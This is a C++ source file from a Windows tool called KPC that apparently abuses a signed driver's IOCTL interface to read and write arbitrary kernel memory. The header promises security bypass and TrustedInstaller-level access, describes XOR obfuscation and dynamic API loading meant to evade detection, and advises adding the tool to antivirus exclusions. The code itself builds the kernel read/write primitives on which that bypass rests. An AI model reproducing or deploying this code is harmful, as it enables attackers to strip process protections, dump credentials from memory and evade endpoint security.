/*******************************************************************************
				██  ██ ██████  ████ 
				██ ██  ██  ██ ██    
				████   ██████ ██    
				██ ██  ██     ██    
				██  ██ ██      ████ 

  KPC - Kernel Process Control
  Advanced Windows Process Protection and Memory Dumping Tool
  Features Dynamic Kernel Driver Loading with Automatic Cleanup
  Achieves TrustedInstaller-level access bypassing Windows security restrictions

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

  -----------------------------------------------------------------------------
  License:
    KPC Custom License 1.0
    - Free for personal, non-commercial and academic use
    - A commercial license is required for business, enterprise or
      revenue-generating activities
    - Redistribution of source code allowed only with this header intact
    - The XOR decryption key for embedded drivers is not provided

  -----------------------------------------------------------------------------
DISCLAIMER:
    This software operates at Windows kernel level with elevated privileges.
    While designed to be safe, conflicts with antivirus software may cause
    system instability or BSOD. For optimal operation, add kpc.exe to your
    security software's exclusion list for both files and processes.
    
    The tool employs advanced anti-analysis techniques including XOR-based 
    string obfuscation, dynamic API loading, and runtime decryption to prevent
    static detection. All critical elements are reconstructed in memory only
    when needed, ensuring minimal security solution interference.
    
    Use responsibly. Author assumes no liability for system conflicts or misuse.

*******************************************************************************/

#include "KpcDrv.h"
#include "common.h"
#include <format>

// IOCTL command codes for driver communication (avc compatible)
constexpr DWORD RTC_IOCTL_MEMORY_READ = 0x80002048;
constexpr DWORD RTC_IOCTL_MEMORY_WRITE = 0x8000204c;

// ======================= Constructor & Destructor =======================
kvc::kvc() = default;

kvc::~kvc() {
    // Explicit cleanup for atomic driver operations - critical for stability
    Cleanup();
}

// ======================= Handle Management System =======================
void kvc::Cleanup() noexcept {
    // Force close device handle to allow proper driver unloading
    if (m_deviceHandle) {
        // Flush any pending I/O operations before closing
        FlushFileBuffers(m_deviceHandle.get());
    }
    m_deviceHandle.reset();
    m_deviceName.clear();
}

bool kvc::IsConnected() const noexcept {
    return m_deviceHandle && m_deviceHandle.get() != INVALID_HANDLE_VALUE;
}

// ======================= Driver Initialization & Connection =======================
bool kvc::Initialize() noexcept {
    // Return success if already connected to driver device
    if (IsConnected()) {
        return true;
    }

    // Construct obfuscated device path to avoid static string detection
    if (m_deviceName.empty()) {
        auto devicePrefix = OBFPATH(L"\\\\.\\");
        m_deviceName = devicePrefix + GetServiceName();  // Must match service name (avc)
    }

    // Initialize dynamic APIs for secure driver communication
    if (!InitDynamicAPIs()) return false;
    
    // Attempt to open driver device with read/write access
    HANDLE rawHandle = g_pCreateFileW(m_deviceName.c_str(), 
                                      GENERIC_READ | GENERIC_WRITE, 
                                      0, nullptr, OPEN_EXISTING, 0, nullptr);

    // Verify device connection was successful
    if (rawHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Store handle in smart pointer for automatic cleanup management
    m_deviceHandle = UniqueHandle(rawHandle);
    return true;
}

// ======================= Memory Read Operations =======================
std::optional<BYTE> kvc::Read8(ULONG_PTR address) noexcept {
    auto value = Read32(address);
    if (!value.has_value()) return std::nullopt;
    return static_cast<BYTE>(value.value() & 0xff);
}

std::optional<WORD> kvc::Read16(ULONG_PTR address) noexcept {
    auto value = Read32(address);
    if (!value.has_value()) return std::nullopt;
    return static_cast<WORD>(value.value() & 0xffff);
}

std::optional<DWORD> kvc::Read32(ULONG_PTR address) noexcept {
    return Read(address, sizeof(DWORD));
}

std::optional<DWORD64> kvc::Read64(ULONG_PTR address) noexcept {
    // Read 64-bit value as two 32-bit operations for driver compatibility
    auto low = Read32(address);
    auto high = Read32(address + 4);
    
    if (!low || !high) return std::nullopt;
    
    return (static_cast<DWORD64>(high.value()) << 32) | low.value();
}

std::optional<ULONG_PTR> kvc::ReadPtr(ULONG_PTR address) noexcept {
#ifdef _WIN64
    // On 64-bit systems, pointers are 8 bytes
    auto value = Read64(address);
    if (!value.has_value()) return std::nullopt;
    return static_cast<ULONG_PTR>(value.value());
#else
    // On 32-bit systems, pointers are 4 bytes
    auto value = Read32(address);
    if (!value.has_value()) return std::nullopt;
    return static_cast<ULONG_PTR>(value.value());
#endif
}

// ======================= Memory Write Operations =======================
bool kvc::Write8(ULONG_PTR address, BYTE value) noexcept {
    return Write(address, sizeof(value), value);
}

bool kvc::Write16(ULONG_PTR address, WORD value) noexcept {
    return Write(address, sizeof(value), value);
}

bool kvc::Write32(ULONG_PTR address, DWORD value) noexcept {
    return Write(address, sizeof(value), value);
}

bool kvc::Write64(ULONG_PTR address, DWORD64 value) noexcept {
    // Write 64-bit value as two separate 32-bit write operations
    DWORD low = static_cast<DWORD>(value & 0xffffffff);
    DWORD high = static_cast<DWORD>((value >> 32) & 0xffffffff);
    return Write32(address, low) && Write32(address + 4, high);
}

// ======================= Low-Level Driver Communication =======================
std::optional<DWORD> kvc::Read(ULONG_PTR address, DWORD valueSize) noexcept {
    // Prepare memory read request structure for driver
    RTC_MEMORY_READ mr{};
    mr.Address = address;
    mr.Size = valueSize;

    // Ensure driver connection is established before operation
    if (!Initialize()) return std::nullopt;

    // Send IOCTL command to driver for kernel memory read operation
    DWORD bytesReturned = 0;
    if (!DeviceIoControl(m_deviceHandle.get(), RTC_IOCTL_MEMORY_READ, 
                        &mr, sizeof(mr), &mr, sizeof(mr), &bytesReturned, nullptr))
        return std::nullopt;

    return mr.Value;
}

bool kvc::Write(ULONG_PTR address, DWORD valueSize, DWORD value) noexcept {
    // Prepare memory write request structure for driver
    RTC_MEMORY_WRITE mw{};
    mw.Address = address;
    mw.Size = valueSize;
    mw.Value = value;

    // Ensure driver connection is established before operation
    if (!Initialize()) return false;

    // Send IOCTL command to driver for kernel memory write operation
    DWORD bytesReturned = 0;
    return DeviceIoControl(m_deviceHandle.get(), RTC_IOCTL_MEMORY_WRITE, 
                          &mw, sizeof(mw), &mw, sizeof(mw), &bytesReturned, nullptr);
}
